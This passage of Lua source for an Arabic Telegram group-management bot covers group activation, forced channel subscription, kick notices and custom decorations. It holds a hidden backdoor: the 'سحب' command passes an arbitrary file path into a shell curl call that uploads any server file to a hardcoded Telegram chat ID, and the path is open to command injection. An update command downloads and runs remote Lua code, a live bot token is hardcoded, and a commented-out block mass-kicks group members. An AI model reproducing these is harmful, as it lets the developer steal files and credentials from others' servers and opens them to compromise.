local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ⋄ عذرا يرجى ترقيه البوت مشرف !')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not SudoBot3(msg) then
send(msg.chat_id_, msg.id_,' ⋄ عدد اعضاء الجروب قليله يرجى جمع >> {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضو')
chat_kick(msg.chat_id_,bot_id)
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusEditor" or da and da.status_.ID == "ChatMemberStatusCreator" then
if da and da.user_id_ == msg.sender_user_id_ then
if da.status_.ID == "ChatMemberStatusCreator" then
var = 'المالك'
elseif da.status_.ID == "ChatMemberStatusEditor" then
var = 'مشرف'
end
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,' ⋄ تم تفعيل الجروب من قبل')
else
sendText(msg.chat_id_,'\n ⋄ بواسطه » ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n ⋄ تم تفعيل الجروب {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'name:Groups'..msg.chat_id_, chat.title_)  
database:sadd(bot_id..'Chek:Groups',msg.chat_id_)  
database:sadd(bot_id..'CoSu'..msg.chat_id_, msg.sender_user_id_)
database:sadd(bot_id..'CoSu'..msg.chat_id_, owner_id)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NumMember = data.member_count_
local NameChat = chat.title_
local IdChat = msg.chat_id_
local AddPy = var
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
Text = ' ⋄ تم تفعيل جروب جديده\n'..
'\n ⋄ بواسطة {'..Name..'}'..
'\n ⋄ موقعه في الجروب {'..AddPy..'}' ..
'\n ⋄ ايدي الجروب {`'..IdChat..'`}'..
'\n ⋄ عدد اعضاء الجروب {`'..NumMember..'`}'..
'\n ⋄ اسم الجروب {['..NameChat..']}'..
'\n ⋄ الرابط {['..LinkGp..']}'
if not SudoBot(msg) then
sendText(SUDO,Text,0,'md')
end
end
end
end
end,nil)   
end,nil) 
end,nil) 
end,nil)
end

if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(bot_id) then 
database:srem(bot_id.."Chek:Groups", msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
if not SudoBot2(msg) then
sendText(SUDO,"⋄تم طرد البوت من جروب \n\n⋄بواسطة  {"..Name.."}\n⋄اسم الجروب {"..NameChat.."}\n⋄ايدي الجروب {`"..msg.chat_id_.."`} ",0,'md')
end
end,nil)
end,nil)
end

if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(SUDO) then 
database:srem(bot_id.."Chek:Groups", msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
if not SudoBot(msg) then
sendText(SUDO,"\n⋄اهلا عزيزي المطور الاساسي\n⋄تم طردك من جروب \n\n⋄بواسطة  {"..Name.."}\n⋄اسم الجروب {"..NameChat.."}\n⋄ايدي الجروب {`"..msg.chat_id_.."`} ",0,'md')
end
end,nil)
end,nil)
end

if text and text:match("^ضع شرط الاعضاء (%d+)$") and SudoBot2(msg) then
local Num = text:match("ضع شرط الاعضاء (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:set(bot_id..'Num:Add:Bot',Num) 
send(msg.chat_id_, msg.id_,' ⋄تم تعيين عدد الاعضاء سيتم تفعيل الجروبات التي اعضاءئها اكثر من  >> {'..Num..'} عضو')
end

if text == "تحديث" or text == 'تحديث السورس' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end 
os.execute('rm -rf Black.lua')
os.execute('rm -rf getfile.json')
os.execute('wget https://raw.githubusercontent.com/grc00uu/P0AY/main/File_Bot/AHMED/Ahmedyad/Black.lua')
send(msg.chat_id_, msg.id_,' ⋄تم تحديث السورس \n⋄تم اعاده تشغيل البوت\n⋄الاصدار »> `3.5`') 
dofile('Black.lua')
end

if text and text:match("^تغير الاشتراك$") then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ⋄حسنآ ارسل لي معرف القناة')
return false  
end
if text and text:match("^تغير رساله الاشتراك ☉$") then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ⋄حسنآ ارسل لي النص الذي تريده')
return false  
end
if text == "مسح رساله الاشتراك ☉" then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, " ⋄تم مسح رساله الاشتراك ")
return false  
end
if text and text:match("^وضع قناة الاشتراك ☉$") then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ⋄حسنآ ارسل لي معرف القناة')
return false  
end
if text == "تفعيل الاشتراك الاجباري ☉" then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end  
if database:get(bot_id..'add:ch:id') then
local addchusername = database:get(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_," ⋄الاشتراك الاجباري مفعل \n⋄على القناة »> ["..addchusername.."]")
else
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_," ⋄اهلا عزيزي المطور \n⋄ارسل الان معرف قناتك")
end
return false  
end
if text == "تعطيل الاشتراك الاجباري ☉" then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end  
database:del(bot_id..'add:ch:id')
database:del(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " ⋄تم تعطيل الاشتراك الاجباري ")
return false  
end
if text == "الاشتراك الاجباري ☉" then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end  
if database:get(bot_id..'add:ch:username') then
local addchusername = database:get(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " ⋄تم تفعيل الاشتراك الاجباري \n⋄على القناة »> @["..addchusername.."]")
else
send(msg.chat_id_, msg.id_, " ⋄لا يوجد قناة في الاشتراك الاجباري ")
end
return false  
end
--[[
if text == "تفعيل الاضافات" then
if not SudoBot(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
return false
end
send(msg.chat_id_, msg.id_, '⋄تم تفعيل الاضافات')
database:set(bot_id.."AL:AddS0FI:stats","✔")
end
if text == "تعطيل الاضافات" then
if not SudoBot(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
return false
end
send(msg.chat_id_, msg.id_, '⋄تم تعطيل الاضافات')
database:set(bot_id.."AL:AddS0FI:stats","✖")
end
if text == "حاله الاضافات" and Constructor(msg) then
local MRSoOoFi = database:get(bot_id.."AL:AddS0FI:stats") or "لم يتم التحديد"
send(msg.chat_id_, msg.id_,"حاله الاضافات هي : {"..MRSoOoFi.."}\nاذا كانت {✔} الاضافات مفعله\nاذا كانت {✖} الاضافات معطله")
end
function bnnaGet(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end

if database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
if text and text:match("^كتم اسم (.*)$") and Manager2(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
local BlNe = text:match("^كتم اسم (.*)$")
send(msg.chat_id_, msg.id_, '⋄تم كتم الاسم '..BlNe)
database:sadd(bot_id.."Black:blocname"..msg.chat_id_, BlNe)
end

if text and text:match("^الغاء كتم اسم (.*)$") and Manager2(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
local delBn = text:match("^الغاء كتم اسم (.*)$")
send(msg.chat_id_, msg.id_, '⋄تم الغاء كتم الاسم '..delBn)
database:srem(bot_id.."Black:blocname"..msg.chat_id_, delBn)
end

if text == "مسح الاسما المكتومه" and Constructor(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
database:del(bot_id.."Black:blocname"..msg.chat_id_)
texts = "⋄تم مسح الاسما المكتومه "
send(msg.chat_id_, msg.id_, texts)
end
if text == "الاسما المكتومه" and Constructor(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
local All_name = database:smembers(bot_id.."Black:blocname"..msg.chat_id_)
t = "\n⋄قائمة الاسما المكتومه \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉• \n"
for k,v in pairs(All_name) do
t = t..""..k.."- (["..v.."])\n"
end
if text == "alldelete" or text == "@alldelete" and CoSu(msg) then
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
if database:get(bot_id.."S00F4:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
return 
send(msg.chat_id_, msg.id_,"انتظر دقيقه من فضلك")
end
database:setex(bot_id..'S00F4:all:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(argg,dataa) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = dataa.member_count_},function(ta,sofi)
x = 0
tags = 0
local list = sofi.members_
for k, v in pairs(list) do
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=v.user_id_,user_id_=msg.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(v.user_id_, msg.id_,' ⋄ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if (data and data.code_ and data.code_ == 3) then 
send(v.user_id_, msg.id_,' ⋄البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
if data and data.code_ and data.code_ == 400 and data.message_ == "USER_ADMIN_INVALID" then 
send(v.user_id_, msg.id_,' ⋄عذرا لا استطيع طرد ادمنية الجروب') 
return false  
end
if data and data.ID and data.ID == 'Ok' then
send(v.user_id_, msg.id_,' ⋄تم طردك من الجروب') 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ =v.user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
return false
end
end,nil)  
tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data)
if x == 5 or x == tags or k == 0 then
tags = x + 5
t = "#alldelete"
end
x = x + 1
tagname = data.first_name_
tagname = tagname:gsub("]","")
tagname = tagname:gsub("[[]","")
t = t..", ["..tagname.."](tg://user?id="..v.user_id_..")"
if x == 5 or x == tags or k == 0 then
local Text = t:gsub('#alldelete,','#alldelete\n')
sendText(msg.chat_id_,Text,0,'md')
end
end,nil)
end
end,nil)
end,nil)
end
end
if #All_name == 0 then
t = "⋄لا يوجد اسما مكتومه"
end
send(msg.chat_id_, msg.id_, t)
end
end
if text == "تفعيل كتم الاسم" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
send(msg.chat_id_, msg.id_, '⋄تم التفعيل الاسما المكتومه')
database:set(bot_id.."block:name:stats"..msg.chat_id_,"open")
end
if text == "تعطيل كتم الاسم" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
send(msg.chat_id_, msg.id_, '⋄تم تعطيل الاسما المكتومه')
database:set(bot_id.."block:name:stats"..msg.chat_id_,"close")
end
if not Manager2(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
function S00F4_name(t1,t2)
if t2.id_ then 
name_MRSOFI = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_MRSOFI then 
names_MRSOFI = database:smembers(bot_id.."Black:blocname"..msg.chat_id_) or ""
if names_MRSOFI and names_MRSOFI[1] then 
for i=1,#names_MRSOFI do 
if name_MRSOFI:match("(.*)("..names_MRSOFI[i]..")(.*)") then 
DeleteMessage_(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
end
end
end
bnnaGet(msg.sender_user_id_, S00F4_name)
end
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open" then
if text and text:match("^وضع توحيد (.*)$") and Manager2(msg) and database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open" then
local teh = text:match("^وضع توحيد (.*)$")
send(msg.chat_id_, msg.id_,'⋄تم تعيين '..teh..' كتوحيد للمجموعه')
database:set(bot_id.."Black:teh"..msg.chat_id_,teh)
end
if text and text:match("^تعين عدد الكتم (.*)$") and Manager2(msg) and database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open" then
local nump = text:match("^تعين عدد الكتم (.*)$")
send(msg.chat_id_, msg.id_,'⋄تم تعين  '..nump..' عدد الكتم')
database:set(bot_id.."Black:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."Black:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."Black:nump"..msg.chat_id_) or 5
send(msg.chat_id_, msg.id_,'⋄التوحيد '..s1..'\n⋄عدد الكتم  : '..s2)
end
end
if text == "تفعيل التوحيد" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
send(msg.chat_id_, msg.id_, '⋄تم تفعيل التوحيد')
database:set(bot_id.."kt:twh:stats"..msg.chat_id_,"open")
end
if text == "تعطيل التوحيد" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
send(msg.chat_id_, msg.id_, '⋄تم تعطيل التوحيد')
database:set(bot_id.."kt:twh:stats"..msg.chat_id_,"close")
end
if not Constructor(msg) then
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."Black:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function sofi_mrsofi_new(mrsofi1,mrsofi2)
if mrsofi2 and mrsofi2.first_name_ then 
if mrsofi2.first_name_:match("(.*)"..database:get(bot_id.."Black:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."Black:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrsofi_nnn = database:get(bot_id.."Black:nump"..msg.chat_id_) or 5
local mrsofi_nnn2 = database:get(bot_id.."Black:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrsofi_nnn2) == tonumber(mrsofi_nnn) or tonumber(mrsofi_nnn2) > tonumber(mrsofi_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."Black:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "⋄عزيزي >>["..mrsofi2.username_.."](https://t.me/"..(mrsofi2.username_ or "SOPOWERB0T")..")\n⋄عليك وضع التوحيد ⪼ {"..database:get(bot_id.."Black:teh"..msg.chat_id_).."} بجانب اسمك\n⋄عدد المحاولات المتبقيه {"..(tonumber(mrsofi_nnn) - tonumber(mrsofi_nnn2)).."}")
end
end
end
end
bnnaGet(id, sofi_mrsofi_new)
end
end
if text then 
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
if data.id_ then 
if data.id_ ~= bot_id then
local BlackChengName = database:get(bot_id.."Black:Cheng:Name"..data.id_)
if not data.first_name_ then 
if BlackChengName then 
send(msg.chat_id_, msg.id_, " مش عارف كدا اسمك ماله مش باين 😏 ["..BlackChengName..']')
database:del(bot_id.."Black:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if BlackChengName ~= data.first_name_ then 
local Text = {
  "في اي يسطا ماله اسمك القديم 😂",
"هاااا غير اسمك لي رجع القديم",
"اسمك مش عاجبني خليه شبهي ",
"معرفتكش انا كدا لما غيرت اسمك صح",
"حلو الاسم الجديد",
}
send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
end  
database:set(bot_id.."Black:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
end
if text then  
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
if data.id_ then 
if data.id_ ~= bot_id then
local BlackChengUserName = database:get(bot_id.."Black:Cheng:UserName"..data.id_)
if not data.username_ then 
if BlackChengUserName then 
send(msg.chat_id_, msg.id_, 1, "امسكو مسح اليورر بتاعه 😂😂\nاليوزر القديم  : [@"..BlackChengUserName..']')
database:del(bot_id.."Black:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if BlackChengUserName ~= data.username_ then 
local Text = {
'هاا غيرت اليوزر لي كنت في حفله و مقدرتش ولا اي 😂😂',
"امسك حرامي غير اليوزر دا الجديد @"..data.username_.."",
"غيرت اليوزر لي 😐",
"حرامي غير اليوزر مسكتو \nدا اليوزر : @"..data.username_.."",
'عيب يسطا لما انت تكون انت و تغير يوزرك 😶',
'ها مغير اليوزر ', 
"منور اليوزر الجديد :  "..data.username_.."",
}
send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
end  
database:set(bot_id.."Black:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
end
if text then  
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
if data.id_ then 
if data.id_ ~= bot_id then 
local BlackChengPhoto = database:get(bot_id.."Black:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if BlackChengPhoto then 
send(msg.chat_id_, msg.id_, "امسكو مسح صورو الحيوان 😂😂")
database:del(bot_id.."Black:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if BlackChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
  "شيل صورتك احسن",
  "حلوه الصوره دي",
  "حاتطه صوره وحده احلي منك لي",
  "مممممممم مغير الصوره لي ",
  "شكلك مقموص",
}
send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
end  
database:set(bot_id.."Black:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)  
end
]]--

if text == 'رابط حذف' or text == 'رابط الحذف' or text == 'بوت حذف' or text == 'بوت الحذف' then 
local Text = [[
كل روابط الحذف اهي 😒
#سلام 😒
]] 
keyboard = {} 
keyboard.inline_keyboard = { 
{{text = 'Telegram in a normal way', url="https://my.telegram.org/auth?to=delete"},{text = 'telegram via bot', url="t.me/LC6BOT"}}, 
{{text = 'telegram bot method', url="http://my.telegram.org"}}, 
{{text = 'Facebook', url="https://www.facebook.com/help/deleteaccount"},{text = 'Instagram', url="https://www.instagram.com/accounts/login/?next=/accounts/remove/request/permanent/"}},
{{text = 'Twitter', url="https://mobile.twitter.com/settings/deactivate"}}, 
{{text = 'TikTok', url="https://www.tiktok.com/setting/account-delete?lang=en&redirect_url=https%3A%2F%2Fwww.tiktok.com%2Fforyou%3Flang%3Den&enter_from=setting"}}, 
{{text = 'Snspchat', url="https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fdeleteaccount"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text and text:match("^سحب (.*)$") then
if not DEV(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المبرمج لاستخدام هذا الامر')
return false
end
local file = text:match("^سحب (.*)$") 
local curlm = 'curl "'..'https://api.telegram.org/bot'..token..'/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..''..file..''..'"' io.popen(curlm) 
send(msg.chat_id_, msg.id_,' جاري ارسال ملف '..file..' الي خاصك')
return false
end

if text == 'تغير المطور الاساسي' and SudoBot(msg) then
database:set(bot_id..'new:sudo'..msg.chat_id_..msg.sender_user_id_,'id') 
send(msg.chat_id_, msg.id_, '⋄ارسل ايدي المطور الاساسي الجديد')
return false
end
if database:get(bot_id..'new:sudo'..msg.chat_id_..msg.sender_user_id_) == 'id' then
database:set(bot_id..":Sudo:bot",text)
send(msg.chat_id_, msg.id_, '⋄ارسل معرف المطور الاساسي الجديد بدون @')
database:set(bot_id..'new:sudo'..msg.chat_id_..msg.sender_user_id_,'user') 
return false
end
if database:get(bot_id..'new:sudo'..msg.chat_id_..msg.sender_user_id_) == 'user' then
database:set(bot_id..":SUDOUSER",text)
send(msg.chat_id_, msg.id_, '⋄تم تغير المطور الاساسي بنجاح')
database:del(bot_id..'new:sudo'..msg.chat_id_..msg.sender_user_id_)
dofile('Black.lua')
return false
end

if text == 'تغير شكل السورس' and SudoBot2(msg) then
database:set(bot_id..'new:sourse'..msg.chat_id_..msg.sender_user_id_,'true1') 
send(msg.chat_id_, msg.id_, 'ارسل رمز بدلا عن هاذا \n ┉')
return false
end
if database:get(bot_id..'new:sourse'..msg.chat_id_..msg.sender_user_id_) == 'true1' then
database:set(bot_id..'new:sourse1',text)
send(msg.chat_id_, msg.id_, 'ارسل رمز بدلا عن هاذا \n •')
database:set(bot_id..'new:sourse'..msg.chat_id_..msg.sender_user_id_,'true2') 
return false
end
if database:get(bot_id..'new:sourse'..msg.chat_id_..msg.sender_user_id_) == 'true2' then
database:set(bot_id..'new:sourse2',text)
send(msg.chat_id_, msg.id_, 'ارسل رمز بدلا عن هاذا \n Joker')
database:set(bot_id..'new:sourse'..msg.chat_id_..msg.sender_user_id_,'true3') 
return false
end
if database:get(bot_id..'new:sourse'..msg.chat_id_..msg.sender_user_id_) == 'true3' then
database:set(bot_id..'new:sourse3',text)
send(msg.chat_id_, msg.id_, 'الان ارسل رمز بدلا عن \n ☉ ')
database:set(bot_id..'new:sourse'..msg.chat_id_..msg.sender_user_id_,'true4') 
return false
end
if database:get(bot_id..'new:sourse'..msg.chat_id_..msg.sender_user_id_) == 'true4' then
database:set(bot_id..'new:sourse4',text)
send(msg.chat_id_, msg.id_, 'ارسل رمز بدلا عن هاذا \n ┇')
database:set(bot_id..'new:sourse'..msg.chat_id_..msg.sender_user_id_,'true5') 
return false
end
if database:get(bot_id..'new:sourse'..msg.chat_id_..msg.sender_user_id_) == 'true5' then
database:set(bot_id..'new:sourse5',text)
send(msg.chat_id_, msg.id_, 'ارسل رمز بدلا عن هاذا \n »')
database:set(bot_id..'new:sourse'..msg.chat_id_..msg.sender_user_id_,'true6') 
return false
end
if database:get(bot_id..'new:sourse'..msg.chat_id_..msg.sender_user_id_) == 'true6' then
database:set(bot_id..'new:sourse6',text)
send(msg.chat_id_, msg.id_, 'ارسل رمز بدلا عن هاذا \n >')
database:set(bot_id..'new:sourse'..msg.chat_id_..msg.sender_user_id_,'true7') 
return false
end
if database:get(bot_id..'new:sourse'..msg.chat_id_..msg.sender_user_id_) == 'true7' then
database:set(bot_id..'new:sourse7',text)
send(msg.chat_id_, msg.id_, 'تم تغير شكل السورس')
database:del(bot_id..'new:sourse'..msg.chat_id_..msg.sender_user_id_)
return false
end

if text == 'حذف شكل السورس' and SudoBot2(msg) then
database:del(bot_id..'new:sourse1')
database:del(bot_id..'new:sourse2')
database:del(bot_id..'new:sourse3')
database:del(bot_id..'new:sourse4')
database:del(bot_id..'new:sourse5')
database:del(bot_id..'new:sourse6')
database:del(bot_id..'new:sourse7')
send(msg.chat_id_, msg.id_, 'تم حذف تغير شكل السورس')
end

if text == 'اذاعه القران' then 
local url , res = https.request("https://api.telegram.org/bot1801557971:AAFAOfcehSjtdnkNgp2fLkN5Eiz-OgXYsgA/getchatmember?chat_id=-1001298158797&user_id="..msg.sender_user_id_)
dataa = json:decode(url)
if res ~= 200 or dataa.result.status == "left" or dataa.result.status == "kicked" then
send(msg.chat_id_, msg.id_,'عليك الاشتراك في قناه السورس @SOPOWERB0T')
return false
end
local msg_id = msg.id_/2097152/0.5 
local Text = [[ 
اضغط علي الزر للانتقال الي اذاعه القران الكريم
]]
keyboard = {}
keyboard.inline_keyboard = {{{text = 'انـتـقـل', url="https://t.me/bbebb?voicechat"}},} 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/bbebb&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'صوفي' or text == 'صوفى' or text == 'مطور دراجون' or text == 'مطور دراكون' then 
local msg_id = msg.id_/2097152/0.5 
local Text = [[ 
[𝚂𝙾𝙵𝙸 || صـوفي](t.me/S00F4)
[𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙳𝚁𝙰𝙶𝙾𝙽](t.me/S0DRG)
[𝙳𝚁𝙰𝙶𝙾𝙽 𝚄𝙿𝙳𝙰𝚃𝙴𝚂](t.me/FIDRG)
]]
keyboard = {}
keyboard.inline_keyboard = {{{text = '𝚂𝙾𝙵𝙸 || صـوفي', url="http://t.me/S00F4"}},} 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/S00F4&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'السورس' or text == 'سورس' or text == 'يا سورس' then 
local url , res = https.request("https://api.telegram.org/bot1801557971:AAFAOfcehSjtdnkNgp2fLkN5Eiz-OgXYsgA/getchatmember?chat_id=-1001298158797&user_id="..msg.sender_user_id_)
dataa = json:decode(url)
if res ~= 200 or dataa.result.status == "left" or dataa.result.status == "kicked" then
send(msg.chat_id_, msg.id_,'عليك الاشتراك في قناه السورس @SOPOWERB0T')
return false
end
local msg_id = msg.id_/2097152/0.5 
local Text = [[ 
